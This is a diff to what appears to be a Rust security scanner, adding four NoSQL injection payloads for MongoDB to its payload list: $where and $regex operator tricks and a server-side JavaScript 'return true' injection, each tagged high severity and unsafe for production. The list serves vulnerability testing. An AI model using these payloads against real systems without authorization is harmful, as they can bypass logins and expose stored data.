@@ -36,5 +36,37 @@ pub fn get_payloads() -> Vec<PayloadDefinition> {
             severity: SeverityLevel::Critical,
             safe_for_production: false,
         },
+        PayloadDefinition {
+            id: Uuid::new_v4().to_string(),
+            payload: "{\"$where\": \"this.password.match(/./)\"}".to_string(),
+            description: "NoSQL Injection: MongoDB $where regex evaluation".to_string(),
+            expected_indicator: ExpectedIndicator::StatusCode(200),
+            severity: SeverityLevel::High,
+            safe_for_production: false,
+        },
+        PayloadDefinition {
+            id: Uuid::new_v4().to_string(),
+            payload: "{\"$regex\": \".*\"}".to_string(),
+            description: "NoSQL Injection: MongoDB $regex match all".to_string(),
+            expected_indicator: ExpectedIndicator::StatusCode(200),
+            severity: SeverityLevel::High,
+            safe_for_production: false,
+        },
+        PayloadDefinition {
+            id: Uuid::new_v4().to_string(),
+            payload: "true, $where: '1 == 1'".to_string(),
+            description: "NoSQL Injection: Parameter pollution $where".to_string(),
+            expected_indicator: ExpectedIndicator::StatusCode(200),
+            severity: SeverityLevel::High,
+            safe_for_production: false,
+        },
+        PayloadDefinition {
+            id: Uuid::new_v4().to_string(),
+            payload: "'; return true; var foo='".to_string(),
+            description: "NoSQL Injection: SSJS boolean true".to_string(),
+            expected_indicator: ExpectedIndicator::StatusCode(200),
+            severity: SeverityLevel::High,
+            safe_for_production: false,
+        }
     ]
 }
